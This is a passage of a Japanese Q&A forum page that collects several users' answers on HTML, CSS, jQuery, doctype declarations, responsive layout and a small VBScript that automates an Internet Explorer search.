*/ padding:10px;/* この値を変えてみる */ } とか・・ 　でも、ウェブ開発されているのでしたら、開発者ツールの豊富なfirefoxをお使いだと思いますが、そのアドオンfirebug( https://addons.mozilla.org/ja/firefox/extensions … )を使用すると、その隙間が、その要素あるいは前後の要素のmarginによるものか、paddingによるものかが一目瞭然です。 ※address要素は 『文書全体、あるいはフォームなど文書の主要部分に関する問い合せ先を示すのに用いられる。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』
Webで作り込むのも将来的にはいいかもしれませんが、とりあえずはGoogle Docsあたりで主さんが張ってるようなドキュメント用意してそのまま皆さんで共有編集してはいかが？ https://www.google.co.jp/intl/ja/docs/about/
＞函館のvalueが1110101となっていますが、この値はどうやって出せばいいのでしょうか？ ajaxで読んでるんですよね？ 函館本線のそのデータは http://www.ekidata.jp/api/l/11101.json じゃないですか？ urlsは対比表なので、全てのvalueに当てはまるものを羅列するか 一定の法則に基づいてプログラムで処理するかでしょうねぇ
＞<style></style>の中身に関して、cssの方に移す必要等はありますでしょうか？ 質問の意味がよくわかりませんが。 ・外部CSSとする ・styleタグで指定する ・タグのstyleパラメータで指定する どれでも好きにすればいいと思います （今回は回答での視認性を高めるためstyleタグを使いました）
こんにちは。 2つ目の <input type="submit" value="アクセス"> はinputじゃないとダメなんでしょうか？ なんとなくページ内リンクのリンク先をテキストで入力するだけなんじゃないのかな？と思ったのですが。 アクセスボタンのinputをaにしてみました。 【HTML】 <form> <input type="text" value=""> <a class="submit" href="">アクセス</a> </form> ・ ・ ・ <div id="example">example</div> 【jQuery】※jQuery本体は別途読み込んでください。 <script> $(function(){ 　$("input:text").on("click blur keydown keyup keypress change touchstart", function(){ 　　var anchor_text = $("input:text").val(); 　　$(".submit").attr("href", "#" + anchor_text); 　}); }); </script> jQueryでテキストエリア内のテキストを取得、それをアクセスボタンのhrefに適用 一応何を入力しても#●●という感じでhrefに適用するようになってます。 元のsubmitでもできますが、もう少しjQueryが必要になってきます。が、不可能ではないです。 頑張ってください。
こんにちは。 入れ子じゃなくてもios safariはiframeバグが出ますのでそのせいかと思います。 下記にサイトに事例と対策のソースまで細かく書いてくれていますので、参考にすると解決すると思います。 http://www.infoscoop.org/blogjp/2014/04/22/mobil … がんばってください。
line-height:は継承されるプロパティだから、 Visual formatting model details - CSS 2.1 spec (ja)( http://momdo.s35.xrea.com/web-html-test/spec/CSS … ) body{line-height:1.6em;} とか、<body style="line-height:1.6em">だけでよい。 ＜blockquote> は、その部分が引用であることを示すタグです。使い方が間違っている。 http://www.asahi-net.or.jp/~sd5a-ucd/rec-html401 … ・・当然ですが、blockquoteをどうプレゼンテーションするかは、ブラウザが持っているスタイルシートによって異なる。 　HTMLは、文書の（意味的な）構造だけを正確に示して、スタイルシートはそれをどう表現するかを指定する。デザインのために<div>や<blockguote>を使ってはならない。 　divは『id属性及び class属性と併用することで、文書に構造を付加するため( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』ですから、例えば <div class="header"> 　この文書のヘッダ </div> <div class="section">本文 　<div class="section"> 　　一つ下の項 　　<div class="aside">本部と直接関係ない記事</div> 　</div> </div> <div class="footer"> 　この文書のフッタ </div> のようになるはず。HTML5では、『文書をよりよく構造化するために( http://standards.mitsue.co.jp/resources/w3c/TR/h … )』そんな小細工をせずに <header> 　この文書のヘッダ </header> <section>本文 　<section> 　　一つ下の項 　　<aside>本部と直接関係ない記事</aside> 　</section> </section> <footer> 　この文書のフッタ </footer> となる。 それはさておき、 ＞｢コンテンツには入れるが文章が読めない｣ 　まずは、基本的にHTMLを正しく書くこと!!! Another HTML Lint - Gateway( http://www.htmllint.net/html-lint/htmllint.html ) 　でチェックすると文法的な間違いが指摘されます。 　個人ならともかく、多少なりとも公共性のあるサイトでしたら、まず正しいHTMLを書くこと。 HTMLは文書構造だけをマークアップするためでデザインはその段階では一切考えなくてよい。 Another HTML Lintでチェックし、間違いを直したら、その文書構造に従ってスタイルシートを書く。 ＜div style="line-height:23px"＞ とか ＜blockquote style="margin:0em 1em 0em 1em"＞ ではなく body{line-height:1.6em;} /* こうしないとフォントサイズが変わったとき間隔が変わる。*/ body>div.header,body>div.section,body>div.footer{ margin:0 5%; } /* こうしないと、左右のマージンが変わってしまう。 */ 通常は body>div.header,body>div.section,body>div.footer{ width:90%;min-width:800px;max-width;1000px; margin:0 auto; } とリキッドにしてタブレットやスマホでも利用て着るようにする。 それと、ガラケーや様々な端末で利用できるように各要素での指定はHTMLの属性で指定して、スタイルシートhead内や外部に回します。要素にstyle=""を書くと、優先順位が高くなりすぎてしまい。外から調整できなくなります。 　特に古いブラウザを考慮しなければならないときは配慮しないと
「WEBサイトのアドレス」とは、「http://」や、「https://」で始まるアドレスの事ですよね。でしたら可能です。 ただ、画像は、ご自身のサーバーに置かないと表示されない場合もあるかも知れません。
画像にリンクを張るのはテキストにリンクを張るのと同じです。 <a href="http://www.hoge.xxx/hoge/"><img src="hoge.jpg"></a> みたいな感じ。
<a href=" target="_blank">に「style="text-decoration:none;"」を加えて <a href=" target="_blank" style="text-decoration:none;">とすると下線が消えます。 ページ内のリンクすべてから下線を消すなら、<head>～</head>の間に下記を加えます。 <style type="text/css"> <!-- a{ text-decoration:none; } --> </style> http://www.1uphp.com/con1/link/link-underbernone … http://abhp.net/hp/HP_HTML_500000.html
IEのバージョンはどこまで対応が必要ですか?
WEBの黎明期にはVRMLがもてはやされましたがその後あまり聞かないですね https://ja.wikipedia.org/wiki/VRML 一応HTML5で3Dを押しだしていますが、そもそもWEBに３Dは 相性が悪いので結局は普及しないんでしょうね
JScriptかVBSなんでしょうけれど・・・（少なくともjavascriptではなさそう） MS系はあまり良くは知らないのですが、 クリックは、Element.Click()でいけるはず。 察するところ、 　1）読み込みが終了する前に処理しようとしている 　　（フォーム入力ができているならこれではなさそうですが） 　2）objIE.document.all.objTag("input")で要素（群）が取得できていない 　　（objTag("input")という取得メソッドはありましたっけ？？） あたりが原因ではないでしょうか？ 要素の取得には、getElementByIdやquerySelector等も使えるはずと思いますので、そちらの方がより簡便かと思います。 以下のVBSは、質問者様の環境では動作しませんか？ 　1）Yahooの検索ページを表示 　2）検索入力に「教えてgoo」と入力 　3）検索ボタンをクリック Dim objIE, elm Set objIE = CreateObject("InternetExplorer.Application") objIE.Visible = True objIE.Navigate "http://search.yahoo.co.jp/" Do Until objIE.readystate = 4 Wscript.Sleep 200 Loop objIE.Document.querySelector("#yschsp").Value = "教えてgoo" Set elm = objIE.Document.querySelector("#sbn input[type='submit']") 'MsgBox elm.Value elm.Click() 'objIE.Quit 'Set objIE = Nothing
こんにちは。　前回回答者です。 今回もHTMLの質問というよりはスクリプトの内容ですね。 ご質問に似たようなケースとして、タブ表示している時やメニューの選択状態を保存しておきたい時などが考えられます。 基本的に、ページ内で設定した状態などは一旦そのページを離れると消去されてしまいますので、その状態を復元するためには、どこかに一時保存しておいてそれを読み込むことが必要になります。 タブやメニューの場合でも対象が異なるだけで同じような方法を利用して実現しています。 http://html-five.jp/350/ http://html-five.jp/364/ http://oshiete.goo.ne.jp/qa/7027045.html 上の例では一時保存場所としてクッキーを利用していますが、最近のブラウザであればWeb Storageを利用しても同様のことが可能です。 http://ascii.jp/elem/000/000/557/557064/ http://www.atmarkit.co.jp/ait/articles/1108/12/n … http://www.html5.jp/trans/w3c_webstorage.html 処理の考え方としては （最新の状態がcookie（又はWebStorage）に保存されているとして） 　・ページ表示時に、cookie（又はWebStorage）からデータを読み込む 　・データが存在すればそれをフィルターのキーとする 　　データが無い時は初期状態としてデフォルトのフィルターに 　・設定したフィルターで、表示時のフィルタリングを行う とすれば、ご質問のような表示が可能になると思いませんか。 一方で、常に最新状態が保存されているようにするためには 　・表示中に（クリック等で）フィルターが変わった時に 　　その内容をcookie（又はWebStorage）に保存する というイベント処理を付け加えておく必要がありますね。 （ページを離れる時に、現在の状態を保存するという考えもありますが） 前回も紹介しましたが、Isotopeには変更時などのイベントを取得できるメソッドが用意されているようですので、修正もそれほど難しくはないはずです。 多分、前回同様にセッティング部分を追加、修正することで対応可能だと想像します。 http://isotope.metafizzy.co/ ※ 時間がとれそうもないので、今回はこれ以上の回答はできそうもありません。 　ご自身でもいろいろ調べてみてください。
●ドメイン/URLが変わる場合、 301リダイレクトが出来れば、激減はしないでしょ → bookmarkしている訪問者がいるから・・・ 検索エンジン（順位）頼りだと、URLが変わったら順位もゼロからのスタート。但し、301にてある程度の評価も引き継ぐ可能性はあるが、バックリンクの評価は無くなるから・・・（Google基準） 一般的に考えると、常連は来る！ 一見さん分が減るかも？ つまり、激減は無く、数割減の可能性あり。 -------------------------- ●ドメイン/URLが同じ場合、 ・ドメイン/ページURL/ディレクトリ構造の変更が一切無ければ問題無し ・無料サーバにてページ内広告や他者リンクなどが挿入されると評価ダウンするかも ・その他、robot.txt sitemap .htaccessなどの設置関係 ・スパム疑惑があるサーバーだと・・・ 今回のはデメリットしか考えられない！ （上手くやって現状維持なので） ◎上位サイト限定ですが、余計な事をしない事が最大のSEOです。
そうなるとホームページではなくウェブサイト(^^) 「本来はウェブブラウザを起動した時や、多くのウェブブラウザに存在するホームボタンを押した時に表示されるウェブページなどの画面（ページ）である( https://ja.wikipedia.org/wiki/%E3%83%9B%E3%83%BC … )」 階層の異なるファイル間は、相対パスで記述するとリンクできません。 その場合は、リンクを絶対パスで記述します。 <nav> 　<ol> 　　<li><a href="/">Top</a></li> 　　<li><a href="/books">著書</a> 　　　　<ol> 　　　　　<li><a href="/books/book1.html">本1</a></li> 　　　　</ol> 　　</li> 　　<li><a href="Prodacts">製品</a></li> 　　<li><a href="/contact/contactus.html">問い合わせ</a></li> 　</ol> </nav> 　サーバーのルートからの絶対パスなら、このナビゲーションをどこにおいてもＯＫです。 　ただしローカルでは、ローカルサーバーを持っていないとテストできない。
ANo1です。 ＞クリックによるフィルタリングも動かない状態になってしまいます。 私の環境では、一応、動作はしているのですが・・・ （ご提示のページ全部のファイルをコピーするのは面倒なので、一部関連しそうな部分のみのコピーで試していますが） ＨＴＭＬ内の 　<a href="#" data-filter=".xx" class="filter_button filter_current">XX</a> に当たる部分を、初期状態としてフィルタリングした状態にしたい場合は、 custum.js内の以下の部分を 　　　// initialize isotope 　$container.isotope({ 　　　itemSelector: '.oi_strange_portfolio_item', 　　　layoutMode: 'masonry' 　 }); 　$('#filters a:first-child').addClass('filter_current'); 次の様に修正して、動作しませんか？ （インデント等を全角空白にしていますので、コピペはしないように） 　　　// initialize isotope 　$container.isotope({ 　　　itemSelector: '.oi_strange_portfolio_item', 　　　layoutMode: 'masonry',　// ←行末にカンマを追加 　　　filter: '.xx'　　　　　　　　　// ←この１行を追加。カンマなし 　 }); //　$('#filters a:first-child').addClass('filter_current');　←コメント行にして無効化します
#1ですが、これじゃだめ？ https://output.jsbin.com/midogebafa/
普通こういうサービスは表示項目が固定なので、デザインのカスタマイズから2カラムタイプとか選べるようになってないですかね。 Seesaaは比較的フルカスタマイズが可能なサービスが多いですが、「何を」別カラムにしたいかによって、できるかできないか変わってきます。 まずは、管理画面からボタン一個でデザインの調整ができるようになっていないかどうか探し、フルカスタマイズが必要ということでしたら、何の要素を横のカラムに出したいか聞いてみるといいと思います。 基本は＃１さんの回答で合っています。
こんにちは。 スマートフォンでも見やすいページにしたいから、レスポンシブページを検討中。 あと、質問者様のスマホで見ると、オールアバウトのサンプルページが、1080pxのデザインではなく768px以下の表示になっているのがなぜなのか？ ということだと思うのですが。 まず「デバイスピクセル（液晶とか有機ELとかディスプレイの解像度）」と、「ブラウザの表示サイズ」とが混同していると思われます。 この二つはイコールではありません。 確かに、現在のアンドロイド端末はデバイスピクセルは1080*1920が主流ですが、これはあくまでディスプレイのことであって、 WEBブラウザの表示幅ではありません。 このデバイスピクセルが1080px（幅が狭いほう）の場合、ブラウザの表示幅はだいたいが360pxになっています。 3分の１です。 デバイス・ピクセル比っていって、ブラウザ1px＊1pxを表示するのにディスプレイでは3px＊3px使っているんです。 これがスマホの解像度がPCよりいいよねってそこはかとなく言われている理由です。 以前だと、このデバイス・ピクセル比が2のスマホが多かったので、その場合のディスプレイは720pxでブラウザ表示幅は360pxなどとなっていました。1.5の端末もありました。 というわけで、質問者様のXperia端末はディスプレイは1080ですが、実際の表示幅は360pxだから、オールアバウトのサンプルページも縦にならんでしまうということになるのです。 また、最近だとiPhone6Plusなんかはディスプレイは1080でブラウザ表示は414だったりするので、上記の限りでもなかったりします。 とりあえず、質問者様に関しては一度ディスプレイの解像度からは離れて、ブラウザ表示領域のほうを優先に考えればよいのだと思います。 基本的にデバイスピクセルが影響するのは画像なので、画像を2倍3倍のものを用意してサイズ指定したり、CSSメディアクエリでしていしたり、というくらいです。 その他のソースは勝手にデバイスピクセルを踏まえたレンダリングで表示してくれます。 なのでレイアウトに関しては質問者様の言う解像度は重要ではないです。 http://responsive-jp.com/ ここ、レスポンシブページを集めてくれてます。 ここにのってるサイトにPCからアクセスして、開いた状態のまま、PCのブラウザ幅を縮めていくと、スマホ用のレイアウトに代わります。 こういうの参考にすればよいと思います。 あとちなみにですが、 レスポンシブページってGoogleが推奨してとか言いますけど、 ぶっちゃけ良し悪しです。 特に海外サイトみたいに、シンプルでフラット、１カラム、総ページ数少ない、画像もSVG程度とかならすごく良いのですが、 日本のサイトってそれと比較すると、 やっぱり、ごちゃっと感受けが良く、PCは２、３カラム当たり前、ページ数多い、写真使い当たり前なんですよね。 そういう場合、スマホから見ると重かったりします。 あとは、当然CSSでの指定がPC・スマホ個別ページより多くなるので、 後付けでコンテンツを増やすとかっていう対応が面倒だったりもします。 上に載せたレスポンシブまとめサイト見るとわかると思うのですが、 やっぱり、PC表示の時点で１カラムで内容もゆったりで・・・というものがほとんどです。 なので、質問者様の作る予定の事業サイトがどんなものかわかりませんが、 そのあたりも考えて、検討したほうがよいかなと思います。 私も企画ものとか簡単なアプリサイトとか軽い内容のものなら、レスポンシブで作りますが、 主力製品サイトなどで内容のもりもりなものは、PC,スマホ別々で作ってます。 頑張ってください。
リンク先のどこでもいいので 右クリックで「ソースの表示」 すると下の様に HTMLが「タグ」付で表示されるけど、 質問の答えに必要なのは最初の数行だけ (※編集済) ------------------------------------------------- <BODY BACKGROUND="(はみ出して見える)背景画像"> <P> <CENTER> <TABLE WIDTH="710" BORDER="0" ....> <TR> <TD .... BGCOLOR="#ffffff"> ------------------------------------------------- これで、幅[WIDTH] 710px(ピクセル)の テーブル(表)を 中央寄せした上でテーブルの「枠 」を="0" で消してるだけ <P>は「改行」(一番上に1行文のスペース空くのはこのせい) 背景白いのは、 BGCOLOR="#ffffff" の部分 BGは、background(バックグラウンド)の略 # + 6桁の英数字が色。 #ffffff ＝ 白 一番上の両側にはみ出ている背景画像の幅は テーブル幅の 710px を超えても超えなくても関係なくて、 超えないものでも、勝手に連続で表示される 只、この表記方法は現在も使えない訳ではないけど、 既に古い記述方法なので「CSS」使用を推奨 http://yume.hacca.jp/koiki/css/table/table.htm http://webcreatorhouse.com/webcreation/120/ 若しくは、HTMLでなく ブログ(3カラム)の方が遥かに簡単 http://www7b.biglobe.ne.jp/~homepage-note/css-ba … https://oshiete.goo.ne.jp/guide/question/thankyou https://oshiete.goo.ne.jp/guide/question/close https://oshiete.goo.ne.jp/guide/about
jqueryはjavascriptですよ。クライアントのコンピューター上で動作する。 ということは、最近多くのブラウザがそうであるように動作しない可能性が高くなります。 ＞PHPやCGIは使えないとして 　ではなくて、PHPないしCGIを使ってデータベースからページを作成するのが本来の方法です。データベースはmySQLなどの本式のデータベースでなくて、簡単なCSVファイルなどで十分でしょう。
各セルを上端に位置揃えすればよいでしょう。 #main, #sub { display: table-cell; vertical-align: top; } 参考 https://developer.mozilla.org/ja/docs/Web/CSS/ve …
エスパー回答します。 >どうも、語と語の間で、シフトキーを押したときに変わるようです． シフトキーではなく、スペースキーを押してたりしませんか？ スペースキーの右に「変換」キーがあるので、そちらに指が触れてたりとか。 あるいは、シフトキーを押下したさい半角/全角キーに影響を与えるような敏感なキーボードだったりとか。 冗談はおいといて、 PCのスペックよりも、 なんのアプリケーションかがこの場合はより重要な気がします。 補足にアプリケーションも記述していただければと思います。 読むと、IEでの入力のような気がしますが、IEならばバージョンも補足に記載されてはいかがですか？ IEでならば特定のサイトでのみ起こる現象でしょうか？ その場合は、そのサイトのURLを補足に記載される必要もあると思います。 IEは変換モードをサイト側で変更できるようにもなっておりますので、 もしかしたらそちらが原因の可能性もあります。 以上、エスパー回答でした。
ソースを一目見て、やる気失せました。 少なくとも Another HTML Lint - Gateway( http://www.htmllint.net/html-lint/htmllint.html ) でチェックして、５０点以上でないと・・・・なんと -414点と見たことない数値になってますよ。長くこの世界にいるけど見たことない。 　さすが「ビルダーのなせる業」 ★この程度のものにtableを使うこと自体がそもそもの誤りです。 　ご存知のように 『単に文書内容を整形する目的だけで表を用いるべきでない。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 『ページレイアウトの目的で表を用いる。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 と15年前のHTML4.01の勧告以来、厳しくとがめられてきた。 ★さらに悪いことにjavascriptを使用して「サムネイルにマウスオーバーで画像を表示」させている。 　最近多い、javascriptを禁止しているブラウザや、検索エンジンは理解できない。 HTMLは単純に、 <ul> 　<li><a href="">No1(緑)</a></li> 　<li><a href="">No2(赤)</a></li> 　<li><a href="">No3(紺)</a></li> 　<li><a href="">No4(スモークピンク)</a></li> 　<li><a href="">No5(黒)</a></li> </ul> たった、だけで済む話ですよ。 firefoxかInternet explorerで ナビゲーションリストを様々にデザインしてみよう。( http://www.ichiya.com/WebService/Howto/sample/HT … ) に進み、ブラウザの[表示]メニューから、[スタイル(シート)]に進み、「画像下」を選択すると似たデザインになります。HTMLには手を付けずにメニューの文字の代わりにサムネイルを置くこともできます。 　tableと異なり、画面が狭くてもよいし、印刷はデザインが変わるし・・(印刷プレビューで確認)
今、気づいたけど　質問がなんかおかしいよね。質問変わってないかな？ もしかして、htmlファイルはwebサーバにあって、動画ファイルは自分のPCにある場合のvideoタグの記述方法ですか？　それは私にはわかりません。 自分は、　htmlファイルも動画ファイルも自分のPC内に有る場合の記述方法でした。
文書構造上全く意味のないclass名なんてつけない。 tabe(表データ)としてもよいのですが、これは単純なリストのほうが良いでしょうね。 <ol class="Members List"><!-- idやclassはその要素に意味を持たせるためのもの --> 　<li>人物名 　　　<ol> 　　　　<li><img src="" width="" height="" alt=""></li> 　　　　<li>肩書</li> 　　　</ol> 　</li> 　<li>人物名 　　　<ol> 　　　　<li><img src="" width="" height="" alt=""></li> 　　　　<li>肩書</li> 　　　</ol> 　</li> ・・・・ あとはスタイルシートでご自由に・・・ 狭いスマホだと２列にするとか、幅広や横置きなら４列にするとか・・。ページ幅いっぱいにするのも楽だし、ガラケーならリストで、パソコンなら６列とか・・
一行目は文書型宣言と言われるもので、その文書がどの文法で記述されているかを指定するためのものです。 そのために、<body></body>内のマークアップを見ない限りそれが正しいか否かは判断できません。 HTML4.01strictでしたら、 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> と書きます。 詳しくは、 7.2 HTMLバージョン情報( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) など もうひとつ役割があって、これはブラウザに対してどの動作モードで描画するかを指定する役目---DOCTYPEスイッチ--があります。 DOCTYPEスイッチ - Google 検索( https://www.google.co.jp/search?q=DOCTYPE%E3%82% … ) 　でたくさん情報が出てきます。 HTML5ないし、HTML4.01strictで作りましょう。 『HTML文書を作る場合には、この仕様における、他のDTDセットではなく strict DTD に適合する文書を作るよう推奨する。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 <!doctype html> は、HTML5であることを示すと同時に、DOCTYPEスイッチの機能としては、すべてのブラウザは、[標準モード]で動作します。 ※内部のマークアップとの整合性については、Another HTML Lint - Gateway( http://www.htmllint.net/html-lint/htmllint.html )のサービスを使うのが便利でしょう。 <!doctype html> <html> <head> <meta charset="utf-8"> <title>サンプル</title> <meta name="description" content=""> <meta name="author" content="IRUKA"> <!--[if IE]> <script src="http://html5shiv.googlecode.com/svn/trunk/html5. … <script src="http://css3-mediaqueries-js.googlecode.com/svn/t … <![endif]--> <link rel="stylesheet" href="css/style.css"> <style media="screen"> <!-- --> </style> </head> ・・・文字コードセットも一致するものを書きます。Shift_JISで保存して、UTF-8を指定するなどしたら文字化けします。 <meta はコンピューターに対するメッセージですから順番は関係ありません。 keywordは、googleに関してはそれを直接、検索には利用していません。 　ここに、検索エンジンにヒットすることを目論んで検索上位の語句を書いたりする輩がいるから・・ 　googleは逆にkeywordに羅列してあるテキストと本文が不一致の場合は、そのページをSPAMとして判断しているようです。 　他の検索エンジンは利用していますから、書いておいても無駄にはならないでしょう。 description (要約)は、場合によったらそのままページの要約として表示されるので書いておきましょう。 　その場合も、必ず本文の内容と一致することが必要です。 　それよりも気になること <meta name="GENERATOR" content="JustSystems Homepage Builder Version 18.0.1.0 for Windows"> 　ホームページビルダーは、SEO的には最悪のツールですから、 ＞検索順位に影響があるか心配です。 　なら、お使いにならないほうがよかろうかと思います。(^^) 　それとホームページビルダーなどWebオーサリングツールを使うとHTMLやCSSの知識がなくても、ウェブページ（ホームページじゃない!!）が作れると誤解されている人がいます。ビルダーの販売キャッチフレーズがそうなのでユーザーは責められませんが・・ 　逆に!!!、ツールを使うときは、テキストエディタで作成する人以上にHTMLやCSSの知識がないとならないのです。なぜなら、ボタン一つでデザインできますが、それは、とんでもない---検索エンジンに最も嫌われる---ページになってしまうからなのです。HTMLやCSSのしっかりした知識に加えて、オーサリングツールの使い方や癖や欠点も熟知していないとならないということです。 →Webオーサリングツール( https://ja.wikipedia.org/wiki/Web%E3%82%AA%E3%83 … ) 　HTMLとは、本来は、HTMLのヒントになったSGMLがそうであるように、「文書の構造をタグで意味を持たせる」ものでデザインとは無縁のものなのです。 『プレーンテキストのみを用いて、「タグ」を使うことによってデータに意味を持たせる( https://ja.wikipedia.org/wiki/Standard_Generaliz … )』 　すなわち <body><!-- ここからは本文(body>だ --> 　<header><!-- ここはこの文書の頭書き(header> --> 　　<h1>見出し</h1><!-- ここはこの文書のトップレベルの見出し(heading)だよ --> 　　<nav><!-- ここからナビゲーション(navigation) --> 　　　<ul><!-- 順不同リスト(unordered list) --> 　　　　<li><!-- リストの項目(list item) --> ・・・【中略】・・・ 　</header> 　<section><!-- 章(section) --> ・・・【中略】・・・ 　　<aside><!-- 本文と直接関係ない(aside) --> 　　<nav><!-- section内の目次 --> とね。・・・ ★それを、どのように表示するかは ブラウザが元々持っている、あるいは作者から指定されたスタイルシートで描画する。 ￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣ ものなのです。 　お分かりのように、その部分が、<section>であるか、<nav>であるか、検索には無関係の<aside>であるかは、オーサリングツールは、一切手助けをしてくれません。作者自身が、その文書を読み解いて最適なタグでマークアップしなければなりません。それにはHTMLの知識が絶対に必要になり、ツールが誤ったものを選択した場合は直さなければなりません。 　これが、SEO（検索エンジン最適化）が必要なページの作成には、オーサリングツールが避けられる最大の理由なのです。 『HTMLエディタで作成するシンプルなコードは検索エンジン最適化にも効果的である( https://ja.wikipedia.org/wiki/Web%E3%82%AA%E3%83 … )』 　スタイルシートについてはもっと悲惨でして、ビルダーに限らずそれぞれの要素をどうデザインするかは、class名を付けてデザインするしかありませんが、文書構想さえマークアップされていれば header nav ul{ 　<header>内の、<nav>配下の<ul>と指定できます。 　こんな当たり前の単純なことすら、ビルダーだけではできない。あなたがコツコツと書くしかない。 参考、Internet Explorer かfirefoxで閲覧すること。 　ナビゲーションリストを様々にデザインしてみよう。( http://www.ichiya.com/WebService/Howto/sample/HT … ) 　のHTMLソースをご覧になるとわかるように極めて単純なHTMLで誰でもリストを加えたりできるでしょう。 　ブラウザの[表示]メニューから、[スタイルシート]へすすみ、任意のスタイルを選択してみたり、ウィンドウ幅を変えたり、あるいは印刷プレビューを確認するとよいでしょう。
参考のURL拝見しました。 http://computer-technology.hateblo.jp/entry/2015 … こちらのコードBlobとwindow.URL.createObjectURLを使用しておりますが、 この機能はMDNによりますと、IE10以降からの対応だそうでIE9はサポートされていないようです。ちなみにIE10ではローカルでは動作しないような記述を見かけました。正しいかは試してないので保障はしません。 safariについては環境を教えていただけないとなんともいえませんが、window.URL.createObjectURLがサポートされてないようです。 https://developer.mozilla.org/ja/docs/Web/API/Blob https://developer.mozilla.org/ja/docs/Web/API/UR …
拡張子を.htmlなどにして保存すればよい。必要なら"index.html"のように引用符で囲む。 なお、エクセルでWebページとして保存したものは、あくまでエクセルデータを、エクセルを持たない人がブラウザで読めるようにしたもので、本来のWebのためのHTMLファイルではありません。 　それもエクセルで作成された表(table)をHTMLのtableにするのが目的であって、全体をレイアウトするためのものではありません。 ★これはHTMLの最も重要なポイントですよ。 エクセルで作成した表をHTMLに変換するためには、csvやtsvというテキスト形式で保存して、それをテキストエディタで置換してtableに変換するのが最善の方法です。 ┌──┬──┬──┐ │ア行│カ行│サ行│ ├──┼──┼──┤ │ あ │ か │ さ │ ├──┼──┼──┤ │ い │ き │ し │ └──┴──┴──┘ というエクセルデータがあれば、csvで ア行,カ行,サ行 あ,か ,さ い,き,し としたのち ,→</td><td> のように置換して最終的に <table> 　<tr> 　　<th>ア行</th><th>カ行</th><th>サ行</th> 　</tr> 　<tr> 　　<td>あ</td><td>か</td><td>さ</td> 　</tr> 　<tr> 　　<td>い</td><td>き</td><td>し</td> 　</tr> </table> に変換します。 もちろん表以外のデザインはtableを使うのは、強く否定、禁止されているのでそれをつかうことはありません。 単に文書内容を整形する目的だけで表を用いるべきでない。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) ページレイアウトの目的で表を用いる。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )
htmlでは、デザイン的なことは触らないです。デザイン的な事はcssで行います。 やり方ですが、<style></style>をhead内に挿入するやり方と、cssファイルを用意しheadから参照するやり方があります。多くのページを同じデザインにしたい場合には、参照するやり方がお勧めです。 どこの{何を:どうする}という書式になります。 tableの｛幅を:720pxにする;}という感じで table{width:720px;}となります。htmlと違って単位は0以外は省略できません。 今回は、説明が楽なhead内に挿入するやり方を説明します。 大きなお世話1 アップする写真の比率は揃える方がいいですし、無駄に大きな写真は通信コストや表示速度の関係で控えた方が。 もし、比率が同じであれば、height:100px等としなくてもリキッドとなります。 大きなお世話2 サイトの表現技術は年々進化しています。古いソフトに頼るより、少し言語を学ばれるといいと思います。基本的なことを理解すれば、あてはめることのできる無料のライブラリーやプラグインが一杯でていますので、古いテーブルレイアウトは卒業されてはいかがでしょうか。 <head></head>の内側に以下を挿入してみてください。 <style> table { max-width: 720px;/*ここの720pxを100%とすると、画面の大きさに合わせて大きく表示します。ブラウザを大きくしたり小さくしたりしてみてください。*/ } td { width: 25%;/*4枚だったから1/4%*/ } a { width: 100%; height: 100px;/*小さな写真の枠の高さを決めています。元写真の大きさを揃えたら消してください*/ display: block; overflow: hidden;/*はみ出た部分は表示しない。元写真の大きさを揃えたら消してください*/ } img { width: 100%; height: auto; } </style>
まぁ提示のソースを最大限に生かすとなるとchangeImage()に引数を与えることでしょうか たとえばこんな感じ <script> var num = 10; var nme = "ファイル名/img"; var exp = "jpg"; cnt = 0; function changeImage(v) { if(v=="+") cnt++; if(v=="-") cnt--; cnt += num; cnt %= num; document.img.src = nme + cnt + "." + exp; document.img.alt = nme + cnt + "." + exp; } </script> <div align="center"> <a href="#" onclick="changeImage('+')"> <img src="ファイル名/img0.jpg" alt="ファイル名/img0.jpg" name="img" width="300" height="300" border="1"></a> <input type="button" value="prev" onclick="changeImage('-')"> <input type="button" value="next" onclick="changeImage('+')"> </div> まぁつっこみどころが多い元ソースなので、もう少しきちんとやった方がいいと思いますけどね・・・
HTML4.01が勧告(1999年)されて、すでに15年・・・今更の感がしますが。 当時から「HTML文書を作る場合には、この仕様における、他のDTDセットではなく strict DTD に適合する文書を作るよう推奨する。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」とされていたので、strictで作成し、かつIEが標準モードで動作するようにDOCTYPEを記述していれば、それらのブラウザ間の誤差はほとんどなくなるはずです。 ＞普段はSafariやChromeで確認しながらコーディングをしています。 　なぜ？？？Firefoxが最もウェブ標準に準拠しています。 　ウェブ開発は、し、代替スタイルシートも扱えるのでプレゼンテーションもいろいろ試せるし、なによりも開発ツールの豊富なfirefoxを使われていると思います。firebug、DOM Inspector、FireMobileSimulator、openWith、Html Validator、Server Switcherとか必要でしょうに・・ 　対応ブラウザは、基本的にはIE10以降、Chromeでよいでしょう。タブレットやスマホを考慮するなら、Safariも対象としなければなりませんね。 日本のブラウザバージョン別シェアグラフ2015 （StatCounter Global Statsより）( http://lhsp.s206.xrea.com/misc/browser-share-ver … ) 　ヨーロッパ--特にドイツでは圧倒的にfirefoxが多いですし、世界的にはChromeが多い。 　すなわち、HTML4.01でしたら <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> <meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> <title>Untitled</title> <meta name="author" content="IRUKA"> <meta http-equiv="Content-Script-Type" content="text/javascript"> <meta http-equiv="Content-Style-Type" content="text/css"> <link rel="stylesheet" type="text/css" media="screen" href="./styleSheet/standard.css"> <link rel="Alternate StyleSheet" type="text/css" media="screen,projection,tv" href="/styleSheet/default.css" title="汎用"> <link rel="styleSheet" type="text/css" media="print,handheld" href="./styleSheet/print.css"> <link rel="START" href="../index.html"> <link rel="NEXT" href="./page1.html"> <link 